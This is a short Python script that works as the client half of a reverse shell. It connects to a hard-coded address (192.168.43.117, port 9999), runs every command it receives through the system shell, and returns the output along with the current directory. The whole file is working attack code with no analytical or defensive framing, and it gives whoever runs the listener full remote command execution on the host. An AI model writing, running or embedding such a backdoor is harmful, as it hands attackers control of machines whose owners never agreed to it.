import os
import socket
import subprocess
sock = socket.socket()
port = 9999
host = '192.168.43.117'
sock.connect((host, port))
while True:
    data = sock.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'),
                               shell=True,
                               stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        cwd = os.getcwd() + ">"
        sock.send(str.encode(output_str + cwd))
